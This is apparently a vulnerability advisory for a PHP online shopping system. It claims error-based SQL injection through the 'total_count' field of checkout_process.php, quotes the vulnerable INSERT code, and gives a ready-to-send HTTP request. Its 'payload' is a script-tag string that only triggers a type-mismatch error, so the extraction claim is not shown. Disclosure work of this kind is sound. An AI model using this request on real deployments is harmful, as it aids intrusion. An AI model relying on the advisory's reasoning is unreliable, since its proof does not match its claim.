## ONLINE SHOPPING SYSTEM checkout_process.php SQL Injection Vulnerability (Error-Based)

### I. Vulnerability Impact

An attacker can exploit this vulnerability to extract sensitive data from the database via error-based SQL injection, including table names, column names, and data from any table. MySQL error messages are directly returned to the client, enabling easy exploitation.

### II. Source Code Analysis

The vulnerability resides in `checkout_process.php`, lines 18 and 36-37:

```php
$total_count = $_POST['total_count'];

$sql = "INSERT INTO `orders_info` 
    (`order_id`,`user_id`,`f_name`, `email`,`address`, 
    `city`, `state`, `zip`, `cardname`,`cardnumber`,`expdate`,`prod_count`,`total_amt`,`cvv`) 
    VALUES ($order_id, '$user_id','$f_name','$email', 
    '$address', '$city', '$state', '$zip','$cardname','$cardnumberstr','$expdate','$total_count','$prod_total','$cvv')";
```

The `$total_count` variable is taken directly from `$_POST['total_count']` without any filtering and concatenated into the INSERT statement. When a non-integer value is injected, MySQL throws a type-mismatch error for the `prod_count` column, and the raw error message is echoed back to the client via `mysqli_error($con)` on line 80.

### III. Payload

The core injection payload is:

```
<ScRiPt>alert(555)</sCrIpT>
```

MySQL response:

```
Incorrect integer value: '<ScRiPt>alert(555)</sCrIpT>' for column 'prod_count' at row 1
```

The raw MySQL error reveals the column name (`prod_count`) and confirms the injection point. An attacker can replace this with a subquery payload to extract arbitrary database data through error messages.

HTTP request:

```
POST /checkout_process.php HTTP/1.1
Host: onlineshop
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=ol422um54c9e387qhla8o63ril

firstname=...&...&total_count=<ScRiPt>alert(555)</sCrIpT>&total_price=...
```

### IV. Source Download

https://code-projects.org/online-shopping-system-in-php-with-source-code/

![image-20260627111657404](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260627111657404.png)